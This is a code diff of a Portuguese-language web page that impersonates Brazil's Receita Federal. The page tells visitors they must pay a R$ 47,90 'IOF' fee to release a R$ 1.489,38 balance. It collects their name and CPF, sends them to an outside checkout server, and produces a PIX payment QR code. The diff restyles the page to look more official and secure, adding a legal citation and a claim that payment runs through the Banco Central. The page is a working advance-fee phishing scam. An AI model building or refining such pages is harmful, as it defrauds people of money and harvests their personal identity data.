@@ -7,91 +7,266 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
     
     <style>
+        /* --- RESET E BASE --- */
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Roboto', sans-serif; background: #f5f5f5; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 480px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #f0f2f5; /* Fundo geral mais moderno */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px 0; /* Espaço em cima e embaixo em telas grandes */
+        }
 
-        /* HEADER RECEITA */
-        .header { background-color: #0038a8; padding: 20px; text-align: center; }
-        .logo-receita { height: 40px; filter: brightness(0) invert(1); }
-        .content { padding: 20px; }
+        /* --- CONTAINER PRINCIPAL (CARD) --- */
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: #fff;
+            border-radius: 16px; /* Bordas mais arredondadas */
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); /* Sombra sofisticada */
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
 
-        /* AVISO */
-        .warning-box { background-color: #fff9e6; border: 1px solid #ffeeba; color: #856404; padding: 15px; border-radius: 6px; font-size: 14px; margin-bottom: 20px; display: flex; gap: 10px; }
-        h1 { font-size: 18px; font-weight: 800; color: #000; margin: 0 0 10px 0; }
-        .description { font-size: 13px; color: #333; line-height: 1.5; margin-bottom: 20px; }
-        .text-red { color: #d32f2f; font-weight: bold; }
+        /* --- HEADER AZUL RECEITA --- */
+        .header {
+            background-color: #003399; /* Azul Receita mais profundo */
+            padding: 25px 20px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(0,51,153,0.2);
+        }
+        .logo-receita {
+            height: 45px; /* Logo um pouco maior */
+            filter: brightness(0) invert(1); /* Garante que fique branco */
+        }
 
-        /* RESUMO */
-        .summary-box { border: 1px solid #ddd; border-radius: 8px; margin-bottom: 25px; overflow: hidden; }
-        .summary-header { background: #f9f9f9; padding: 15px; font-weight: 800; font-size: 16px; border-bottom: 1px solid #eee; }
-        .summary-row { display: flex; justify-content: space-between; padding: 15px; font-size: 14px; border-bottom: 1px solid #f0f0f0; }
-        .summary-row:last-child { border-bottom: none; }
-        .val-gain { font-weight: 600; } .val-tax { color: #d32f2f; font-weight: 600; } .val-total { font-weight: 800; font-size: 16px; color: #000; }
-        .tax-desc { font-size: 11px; color: #d32f2f; margin-top: 4px; display: block; }
-        .info-pix { padding: 15px; background: #fdfdfd; font-size: 11px; color: #666; display: flex; align-items: center; gap: 5px; }
+        .content { padding: 30px 25px; }
 
-        /* FORMULARIO */
-        .form-label { font-size: 13px; font-weight: bold; color: #333; margin-bottom: 5px; display: block; }
-        .form-input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 15px; margin-bottom: 15px; }
+        /* --- BOX DE AVISO --- */
+        .warning-box {
+            background-color: #fffdf0; /* Amarelo mais suave */
+            border-left: 5px solid #ffd700; /* Borda lateral de destaque */
+            color: #856404;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 25px;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .warning-icon { font-size: 20px; }
 
-        /* BOTÃO */
-        .btn-pay { background-color: #00c853; color: white; width: 100%; padding: 18px; border: none; border-radius: 6px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; margin-top: 10px; }
-        .btn-pay:disabled { background-color: #ccc; }
+        /* --- TÍTULOS E TEXTOS --- */
+        h1 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin: 0 0 10px 0;
+            line-height: 1.2;
+        }
+        .description {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .text-red { color: #d32f2f; font-weight: 600; }
 
-        /* MODAL */
-        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 300; align-items: center; justify-content: center; padding: 20px; }
-        .qr-card { background: white; padding: 25px; border-radius: 10px; text-align: center; width: 100%; max-width: 350px; }
-        .qr-img { width: 100%; margin: 15px 0; }
-        .pix-code { background: #f0f0f0; padding: 10px; font-size: 11px; word-break: break-all; margin-bottom: 15px; }
+        /* --- CARD DE RESUMO FINANCEIRO --- */
+        .summary-box {
+            background: #fff;
+            border-radius: 12px;
+            border: 1px solid #eef0f2;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        .summary-header {
+            background: #f8f9fa;
+            padding: 15px 20px;
+            font-weight: 800;
+            font-size: 15px;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid #eef0f2;
+        }
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 18px 20px;
+            font-size: 15px;
+            border-bottom: 1px solid #f0f0f0;
+            align-items: center;
+        }
+        
+        /* Destaques de Valor */
+        .val-gain { font-weight: 600; color: #333; font-size: 16px; }
+        
+        .row-tax { background-color: #fff5f5; } /* Fundo avermelhado suave */
+        .val-tax { color: #d32f2f; font-weight: 800; font-size: 17px; }
+        .tax-desc { font-size: 12px; color: #d64949; display: block; margin-top: 4px; }
+
+        /* Total a Receber (Grande Destaque) */
+        .row-total { background-color: #f0fff4; border-bottom: none; } /* Fundo esverdeado suave */
+        .label-total { font-weight: 800; font-size: 16px; color: #1a1a1a; text-transform: uppercase; }
+        .val-total { font-weight: 900; font-size: 24px; color: #00c853; } /* Valor Grande Verde */
+
+        /* Informação do Pix */
+        .pix-info {
+            background: #fafafa;
+            padding: 12px 20px;
+            font-size: 12px;
+            color: #666;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-top: 1px solid #eef0f2;
+            font-weight: 500;
+        }
+
+        /* --- FORMULÁRIO --- */
+        .input-hidden-group { margin-bottom: 25px; }
+        .form-label {
+            font-size: 13px; font-weight: 700; color: #444; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0; /* Borda mais grossa e moderna */
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            transition: 0.3s;
+            background: #fdfdfd;
+        }
+        .input-field:focus {
+            border-color: #003399; /* Foco azul receita */
+            background: #fff;
+        }
+
+        /* --- BOTÃO DE AÇÃO --- */
+        .btn-pay {
+            background: linear-gradient(to bottom, #00d455, #00c853); /* Degradê sutil */
+            color: white;
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 200, 83, 0.3); /* Sombra verde */
+            transition: 0.2s;
+        }
+        .btn-pay:active { transform: scale(0.99); box-shadow: 0 2px 5px rgba(0, 200, 83, 0.3); }
+        .btn-pay:disabled { background: #ccc; box-shadow: none; transform: none; cursor: not-allowed; }
+
+        /* --- MODAL QR CODE (Mantido Funcional) --- */
+        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 300; align-items: center; justify-content: center; padding: 20px; }
+        .qr-card { background: white; padding: 30px; border-radius: 16px; text-align: center; width: 100%; max-width: 380px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
+        .qr-img { width: 220px; margin: 20px auto; display: block; border-radius: 8px; border: 1px solid #eee; }
+        .pix-copia { background: #f0f2f5; padding: 15px; font-size: 12px; word-break: break-all; border-radius: 8px; margin-bottom: 20px; color: #555; border: 1px solid #e0e0e0; }
+
+        /* Responsividade para telas pequenas (remove margem do body) */
+        @media (max-width: 480px) {
+            body { padding: 0; }
+            .container { border-radius: 0; min-height: 100vh; }
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="logo-receita"></div>
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" alt="Receita Federal" class="logo-receita">
+        </div>
+
         <div class="content">
-            <div class="warning-box"><span>⚠️</span><div><strong>Imposto (IOF) obrigatório</strong></div></div>
-            <h1>Imposto sobre Operações Financeiras (IOF)</h1>
-            <p class="description">O pagamento do IOF é obrigatório.<br><br><span class="text-red">* Necessário para receber o valor acumulado.</span></p>
             
-            <div class="summary-box">
-                <div class="summary-header">Resumo</div>
-                <div class="summary-row"><span>Valor ganho</span><span class="val-gain">R$ 1.489,38</span></div>
-                <div class="summary-row" style="background-color: #fff5f5;"><div><span>Valor a ser pago (IOF)</span><span class="tax-desc">Imposto sobre Operações</span></div><span class="val-tax">- R$ 47,90</span></div>
-                <div class="summary-row"><span style="font-weight:bold;">Total a receber</span><span class="val-total">R$ 1.489,38</span></div>
-                <div class="info-pix">Pagamento de R$47,90 processado via PIX imediato.</div>
+            <div class="warning-box">
+                <span class="warning-icon">⚠️</span>
+                <div><strong>Atenção: Imposto (IOF) obrigatório pendente.</strong></div>
             </div>
 
-            <div class="form-section">
+            <h1>Imposto sobre Operações Financeiras (IOF)</h1>
+            
+            <p class="description">
+                Para a liberação do saldo acumulado, a legislação vigente (Lei nº 8.894/94) exige a quitação do IOF.<br><br>
+                <span class="text-red">O não pagamento impede a transferência imediata do valor para sua conta.</span>
+            </p>
+
+            <div class="summary-box">
+                <div class="summary-header">Resumo da Operação</div>
+                
+                <div class="summary-row">
+                    <span>Saldo a liberar</span>
+                    <span class="val-gain">R$ 1.489,38</span>
+                </div>
+
+                <div class="summary-row row-tax">
+                    <div>
+                        <span>Valor do IOF (Imposto)</span>
+                        <span class="tax-desc">Taxa única de regularização</span>
+                    </div>
+                    <span class="val-tax">- R$ 47,90</span>
+                </div>
+
+                <div class="summary-row row-total">
+                    <span class="label-total">Valor Líquido a Receber</span>
+                    <span class="val-total">R$ 1.489,38</span>
+                </div>
+
+                <div class="pix-info">
+                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/><path d="M7.002 11a1 1 0 1 1 2 0 1 1 0 0 1-2 0zM7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995z"/></svg>
+                    Pagamento seguro processado via PIX do Banco Central.
+                </div>
+            </div>
+
+            <div class="input-hidden-group">
                 <label class="form-label">Nome do Contribuinte</label>
-                <input type="text" id="nome" class="form-input" placeholder="Nome Completo">
-                <label class="form-label">CPF</label>
-                <input type="tel" id="cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)">
+                <input type="text" id="nome" class="input-field" placeholder="Digite seu nome completo">
+                <label class="form-label">CPF do Titular</label>
+                <input type="tel" id="cpf" class="input-field" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)">
             </div>
 
             <button class="btn-pay" onclick="gerarPixIOF()">PAGAR IOF E LIBERAR VALOR</button>
+
         </div>
     </div>
 
     <div id="qr-screen">
         <div class="qr-card">
-            <h3>Pagamento IOF</h3>
-            <p style="font-size:14px;">Escaneie para finalizar.</p>
+            <h3 style="margin-top:0; color:#333; font-weight:800;">Pagamento IOF</h3>
+            <p style="font-size:14px; color:#666;">Escaneie o QR Code abaixo para finalizar a regularização.</p>
             <img id="qr-image" class="qr-img">
-            <div id="pix-copia" class="pix-code"></div>
-            <button class="btn-pay" style="padding:10px; font-size:14px;" onclick="copiarCodigo()">Copiar PIX</button>
-            <div id="msg-sucesso" style="margin-top:15px; color:green; display:none;">✅ IMPOSTO PAGO!<br>Valor liberado.</div>
+            <div id="pix-copia" class="pix-copia"></div>
+            <button class="btn-pay" style="padding:12px; font-size:14px;" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+            <div id="msg-sucesso" style="margin-top:20px; color:#00c853; font-weight:bold; display:none; font-size:16px;">
+                ✅ IMPOSTO PAGO!<br>Seu valor está sendo liberado.
+            </div>
         </div>
     </div>
 
     <script>
+        // --- MANTENDO A MESMA LÓGICA FUNCIONAL ---
         const API_URL = "https://checkout-pix-profissional.onrender.com";
         function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
         
         async function gerarPixIOF() {
             const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-pay');
-            if(n.length<3||c.length<11) return alert("Preencha Nome e CPF.");
-            b.innerText="GERANDO..."; b.disabled=true;
+            if(n.length<3||c.length<11) return alert("Preencha Nome e CPF do contribuinte.");
+            b.innerText="GERANDO GUIA..."; b.disabled=true;
             try {
                 const r=await fetch(`${API_URL}/pix`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:47.90,name:n,cpf:c})});
                 const d=await r.json();
@@ -100,11 +275,11 @@
                     document.getElementById('pix-copia').innerText=d.point_of_interaction.transaction_data.qr_code;
                     document.getElementById('qr-screen').style.display='flex';
                     monitor(d.id);
-                } else { alert("Erro."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
-            } catch(e){ alert("Erro."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
+                } else { alert("Erro ao gerar guia. Tente novamente."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
+            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
         }
         function monitor(id){ setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'||j.status==='refunded'){ document.getElementById('msg-sucesso').style.display='block'; document.getElementById('qr-image').style.opacity=0.3; } }catch(e){} },3000); }
-        function copiarCodigo(){ navigator.clipboard.writeText(document.getElementById('pix-copia').innerText); alert("Copiado!"); }
+        function copiarCodigo(){ navigator.clipboard.writeText(document.getElementById('pix-copia').innerText); alert("Código PIX copiado!"); }
     </script>
 </body>
 </html>
